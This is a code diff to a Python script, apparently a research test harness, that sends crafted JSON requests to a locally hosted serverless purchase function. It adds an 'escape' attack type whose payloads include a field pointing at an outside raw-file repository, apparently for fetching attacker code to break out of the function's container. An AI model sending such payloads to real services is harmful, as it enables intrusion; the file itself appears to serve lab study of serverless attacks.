@@ -92,7 +92,7 @@ if __name__ == "__main__":
     )
     parser.add_argument(
         "--data_attack_type",
-        choices=["modify", "leak", "warm1", "warm2", "warm", "cfattack", "normal"],
+        choices=["modify", "leak", "warm1", "warm2", "warm", "cfattack", "escape", "normal"],
         required=True,
         help="Type of attack data",
     )
@@ -106,8 +106,8 @@ if __name__ == "__main__":
 
     args = parser.parse_args()
 
-    url = "http://localhost:31112/function/zjy-alastor-2n-product-purchase"
-    # url = "http://localhost:31112/function/zch-2n-product-purchase"
+    # url = "http://localhost:31112/function/zjy-alastor-2n-product-purchase"
+    url = "http://localhost:31112/function/zch-2n-product-purchase"
 
     headers_benign_template = {
         "Content-Type": "application/json",
@@ -160,6 +160,22 @@ if __name__ == "__main__":
         "cfattack" : "true"
     }
 
+    data_attack_escape_1 = {
+        "id": 1,
+        "user": "alice",
+        "creditCard": "1234-5678-9",
+        "malicious": "escape_S1",
+        "attackserver": "https://gitee.com/jinyuchata/escape-host/raw/master"
+    }
+
+    data_attack_escape_2 = {
+        "id": 1,
+        "user": "alice",
+        "creditCard": "1234-5678-9",
+        "malicious": "escape_S2",
+        "payload": ""
+    }
+
     if args.data_attack_type == "modify":
         data_attack = [data_attack_modify]
     elif args.data_attack_type == "leak":
@@ -172,6 +188,8 @@ if __name__ == "__main__":
         data_attack = [data_attack_warm_1, data_attack_warm_2]
     elif args.data_attack_type == "cfattack":
         data_attack = [data_attack_cf]
+    elif args.data_attack_type == "escape":
+        data_attack = [data_attack_escape_1, data_attack_escape_2]
 
     perform_requests(
         url,
